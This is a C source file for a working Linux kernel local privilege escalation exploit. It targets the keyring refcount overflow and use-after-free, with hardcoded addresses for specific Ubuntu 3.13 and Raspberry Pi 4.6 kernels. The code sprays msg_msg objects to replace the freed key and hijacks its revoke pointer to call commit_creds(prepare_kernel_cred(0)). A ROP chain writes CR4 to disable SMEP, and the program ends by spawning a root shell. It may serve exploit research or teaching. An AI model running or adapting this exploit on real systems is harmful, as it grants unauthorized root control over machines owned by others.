#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <keyutils.h>
#include <unistd.h>
#include <time.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <limits.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#if ( __WORDSIZE == 64 )
#define _BUILD_64   1
#endif

/* 
 * This code is from
 * https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8fhttps://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f
 *
 * gcc -o leak leak.c -lkeyutils
 * ./leak
 * cat /proc/keys
 */

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

#define STRUCT_MSG_MSG_LEN (48)

#ifdef LINUX_VER_4
/* For Linux RPi3 4.6.3-17570-g9f38d0f-dirty #41 SMP Mon Apr 16 15:13:11 KST 2018 aarch64 GNU/Linux */
/* optee kernel for rpi3 */
#define STRUCT_KEY_LEN (184)

#define LINUX_KEY_UID_IDX (104)
#define LINUX_KEY_PERM_IDX (112)
#define LINUX_KEY_FLAGS_IDX (120)
#define LINUX_KEY_TYPE_IDX (128)

#define COMMIT_CREDS_ADDR (0xffffff80080c07e0)
#define PREPARE_KERNEL_CREDS_ADDR (0xffffff80080c0ba8)
#else
/* For Linux kernel 3.13.0-40-generic #69-Ubuntu SMP Thu Nov 13 17:53:56 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux */
#define STRUCT_KEY_LEN (176)

#define LINUX_KEY_UID_IDX (96)
#define LINUX_KEY_PERM_IDX (104)
#define LINUX_KEY_FLAGS_IDX (112)
#define LINUX_KEY_TYPE_IDX (120)

#define COMMIT_CREDS_ADDR (0xffffffff81090ad0)
#define PREPARE_KERNEL_CREDS_ADDR (0xffffffff81090dd0)
#endif

/* It's to fit "struct key" to realloc freed object */
#define STRUCT_LEN (STRUCT_KEY_LEN - STRUCT_MSG_MSG_LEN)

#define KEY_UID_IDX ((LINUX_KEY_UID_IDX) - (STRUCT_MSG_MSG_LEN))
#define KEY_PERM_IDX ((LINUX_KEY_PERM_IDX) - (STRUCT_MSG_MSG_LEN))
#define KEY_FLAGS_IDX ((LINUX_KEY_FLAGS_IDX) - (STRUCT_MSG_MSG_LEN))
#define KEY_TYPE_IDX ((LINUX_KEY_TYPE_IDX) - (STRUCT_MSG_MSG_LEN))

/* ROP gadgets to bypass SMEP */
/* Specific on Linux kernel 3.13.0-40-generic #69-Ubuntu SMP Thu Nov 13 17:53:56 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux */

// - xchg eax, esp ; ret
// - pop rdi ; ret
// - mov dword ptr [rdi], eax ; ret
// - pop rax ; ret
// - mov rax, cr4 ; ret
// - pop rcx ; ret
// - jmp rcx

#define XCHG_EAX_ESP_RET (0xffffffff81405ba0UL)
#define POP_RDI_RET		(0xffffffff81237d0dUL)
#define MOV_EAX_DWORD_PTR_RDI_RET (0xffffffff810e93f7UL)
#define POP_RCX_RET			(0xffffffff8117ec63UL)
#define POP_RAX_RET			(0xffffffff81009f16UL)
#define MOV_RAX_CR4_RET		(0xffffffffa03930a9UL)	/* This gadget is from info.ko */
#define JMP_RCX				(0xffffffff8125e24dUL)
#define NOP_RET				(0xffffffff8100363fUL)

/* Emulate kernel struct "key_type" to overwrite "key_type" */
#ifdef LINUX_VER_4
struct key_type {
	char *name;
	size_t def_datalen;
	void *vet_description;
	void *preparse;
	void *free_preparse;
	void *instantiate;
	void *update;
	void *match_preparse;
	void *match_free;
	void *revoke;
	void *destroy;
	void *describe;
	void *read;
	void *request_key;
	void *link[2];
	void *lock_class[2];
};
#else
struct key_type {
	char *name;
	size_t def_datalen;
	unsigned def_lookup_type;
	void *vet_description;
	void *preparse;
	void *free_preparse;
	void *instantiate;
	void *update;
	void *match;
	void *revoke;
	void *destroy;
	void *describe;
	void *read;
	void *request_key;
	void *link[2];
	void *lock_class[2];
};
#endif

void userspace_revoke(void *key) {
	commit_creds(prepare_kernel_cred(0));
}

/* We have to preserve ESP of original path */
uint64_t saved_esp;

/*
 * movq %%rbp, %%rax - copy from rbp to rax.
 * movq $0xffffffff00000000, %%rdx - set rdx. It's mask to restore upper 4 bytes.
 * andq %%rdx, %%rax - rax = rdx & rax(==rbp). rax's upper 4 bytes == RBP, rax's lower 4bytes == 0
 * movq %0, %%rdx - movq saved_esp, rdx.  
 * addq %%rdx, %%rax - rax = rax + rdx.  rax == original RSP
 * movq %%rax, %%rsp - restore RSP
 */

/*
 * The role of "payload"
 * 
 * - 1) Restore RBP, RSP to execute original path.
 * - 2) Call our shellcode (== userspace_revoke()) to get root.
 * - 3) ret;  Return from here to original path.
 */
void wrapper() {
	asm volatile ("					\n\
	payload:					\n\
		movq %%rbp, %%rax			\n\
		movq $0xffffffff00000000, %%rdx		\n\
		andq %%rdx, %%rax			\n\
		movq %0, %%rdx				\n\
		addq %%rdx, %%rax			\n\
		movq %%rax, %%rsp			\n\
		call userspace_revoke	\n\
		ret					\n\
	" : : "m"(saved_esp) : );
}

void payload(void);

/*
 * When stack-pivot is triggered,
 * EAX will be copied from ESP via XCHG_EAX_ESP_RET.
 * We should preserve ESP, So that save ESP into saved_esp.
 */

/*
 * What "CHAIN_SAVE_ESP" does?
 * - 1) Save &saved_esp into RDI
 * - 2) Copy from EAX into *RDI(== *saved_esp).
 * -- In summary, Save original ESP into saved_esp.
 */
#define CHAIN_SAVE_ESP				\
	*stack++ = POP_RDI_RET;			\
	*stack++ = (uint64_t)&saved_esp;	\
	*stack++ = MOV_EAX_DWORD_PTR_RDI_RET;

/*
 * We have to customize ROPchain that disable SMEP
 * Because, our linux kernel doesn't have some ROP gadget in below.
 */
#define SMEP_DISABLE_VAL (0x0407e0UL) /* smep enable - (0x1407e0UL) */

/*
 * What "CHAIN_DISABLE_SMEP" does?
 * - 1) Save SMEP_DISABLE_VAL into RAX.
 * - 2) Copy from RAX into CR4.
 * -- In summary, Modify CR4 register to disable SMEP.
 */
#define CHAIN_DISABLE_SMEP			\
	*stack++ = POP_RAX_RET;			\
	*stack++ = SMEP_DISABLE_VAL;	\
	*stack++ = MOV_RAX_CR4_RET;

/*
 * What "CHAIN_JMP_PAYLOAD" does?
 * Execute our shellcode, and restore RBP,RSP, return to original path.
 */
#define CHAIN_JMP_PAYLOAD                 \
	*stack++ = POP_RCX_RET;               \
	*stack++ = (uint64_t)&payload;        \
	*stack++ = JMP_RCX;

void build_fake_stack(void)
{
	uint64_t stack_aligned, stack_addr;
	unsigned long page_size = 4096;
	unsigned long stack_size, stack_offset;
	uint64_t *stack, *ptr;
	int chain_count = 9;
	int i;
	unsigned long xchg_addr = XCHG_EAX_ESP_RET;

	/* Calculate address where fake stack should be located. */
	/*
	 * RAX will be set to RSP. and xchg_addr will be RAX according to intel indirect branch rule.
	 * In other words, Candidate for fake stack address is xchg_addr.
	 */
	stack_aligned = (xchg_addr & 0x00000000ffffffffUL) & ~(page_size - 1);
	stack_addr = stack_aligned - (page_size * 128 * 1024);
	stack_size = page_size * 256 * 1024;	/* 1GB fake stack */
	stack_offset = xchg_addr % page_size;

	/* Allocate fake stack */
	stack = mmap((void*)stack_addr, stack_size, PROT_READ | PROT_WRITE,
				MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if (stack == MAP_FAILED || stack != (void*)stack_addr) {
		perror("mmap error\n");
		exit(-1);
	}

	ptr = (uint64_t*)((char*)stack_aligned + stack_offset);
	printf("stack : %lx~%lx, userspace_revoke : %lx\n", (unsigned long)ptr, (unsigned long)(stack_addr + stack_size), (unsigned long)userspace_revoke);
	printf("saved_esp : %lx\n", (unsigned long)&saved_esp);

	/* Install ROP chains */
	for (i = -1024; i<=1024; i++) {
		stack = (ptr + (i * 9));
		CHAIN_SAVE_ESP;
		CHAIN_DISABLE_SMEP;
		CHAIN_JMP_PAYLOAD;
	}
}

#ifdef TEST_LKM
struct info_arg {
	void *call;
	void *arg1;
};

void test_lkm(void)
{
	int fd;
	int r;
	struct info_arg iarg;

	build_fake_stack();

	fd = open("/proc/info", O_RDWR, S_IXUSR | S_IROTH);
	if (fd < 0) {
		printf("fail to open\n");
		exit(0);
	}

	iarg.call = (void *)XCHG_EAX_ESP_RET;
	iarg.arg1 = NULL;

	r = ioctl(fd, 3, &iarg);
	if (r) {
		printf("ioctl error\n");
	}
	
	close(fd);

	printf("uid=%d, euid=%d\n", getuid(), geteuid());
	execl("/bin/sh", "/bin/sh", NULL);
	exit(0);
}
#else
void test_lkm(void) {}
#endif

int main(int argc, char **argv)
{
	const char *keyring_name;
	size_t i = 0;
	unsigned long int l = 0x100000000/2;
	key_serial_t serial = -1;
	pid_t pid = -1;
	struct key_type *my_key_type = NULL;
	int uid;

#ifdef _BUILD_64
	struct {
		long mtype;
		char mtext[STRUCT_LEN];
	} msg = {0x4141414141414141, {0}};
	int msqid;
#else
	struct {
		long mtype;
		char mtext[STRUCT_LEN];
	} msg = {0x41414141, {0}};
	int msqid;
#endif

	if (argc != 2) {
		printf("USAGE : ./exploit <key_name>\n");
		return -1;
	}

	printf("uid=%d, euid=%d\n", getuid(), geteuid()); 
	uid = getuid();

    commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;
    prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CREDS_ADDR;

	test_lkm();

	my_key_type = malloc(sizeof(*my_key_type));
	printf("revoke offset : %ld\n", (unsigned long)(&my_key_type->revoke) - (unsigned long)my_key_type);

	/* Our goal is to overwrite revoke() in keyring object */

#ifdef BYPASS_SMEP
	my_key_type->revoke = (void *) XCHG_EAX_ESP_RET; /* with SMEP */
#else
	my_key_type->revoke = (void *)userspace_revoke; /* without SMEP */
#endif
	memset(msg.mtext, 'A', sizeof(msg.mtext));

	*(int *)(&msg.mtext[KEY_UID_IDX]) = uid; /* key->uid. geteuid() */
	*(int *)(&msg.mtext[KEY_PERM_IDX]) = 0x3f3f3f3f; /*key->perm */
	*(unsigned long *)(&msg.mtext[KEY_TYPE_IDX]) = (unsigned long)my_key_type;

	printf("attacker's key_type : 0x%lx\n", (unsigned long)my_key_type);
	
	if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
		perror("msgget");
		exit(-1);
	}

	keyring_name = argv[1];

	/* set new keyring object */
	serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);
	if (serial < 0) {
		perror("keyctl - first");
		return -1;
	}

	if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) < 0) {
		perror("keyctl - setperm");
		return -1;
	}

	puts("try to overflow..");

	for (i=1; i<0xfffffffd; i++) {
		if (i % 10000000 == 0) {
			printf("try : %d\n", i);
		}
		if (i == (0xffffffff - l)) {
			l = l/2;
			sleep(5);
		}
		if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
			perror("keyctl");
			return -1;
		}
	}
	sleep(5);	/* Ensure refcount is not going to be too large */

	for (i=0; i<5; i++) {
		if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
			perror("keyctl - overflow");
			return -1;
		}
	}

	puts("finish overflow");
	puts("forking.. It's to reallocated freed keyring object, and overwrite it");

	for (i=0; i<64; i++) {
		pid = fork();
		if (pid == -1) {
			perror("fork");
			return -1;
		}

		if (pid == 0) {
			sleep(2);
			if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
				perror("msgget");
				exit(-1);
			}
			for (i=0; i<64; i++) {
				/* Allocate msg object same size of which keyring object */
				/* and overwrite attacker's message to freed keyring object */
				/*
				 * When call msgsnd with size (sizeof(msg.mtext)),
				 * the size of dynamic object is allocated by SLAB.
				 */
				if (msgsnd(msqid, &msg, sizeof(msg.mtext), 0) == -1) {
					perror("msgsnd");
					exit(-1);
				}
			}
			sleep(-1);
			exit(1);
		}
	}

	puts("finished forking");
	sleep(5);

	puts("calling revoke");

#ifdef BYPASS_SMEP
	build_fake_stack();
#endif
	if (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == -1) {
		perror("keyctl_revoke");
	}

	/* Enter root-shell */
	printf("uid=%d, euid=%d\n", getuid(), geteuid());
	execl("/bin/sh", "/bin/sh", NULL);
	return 0;
}
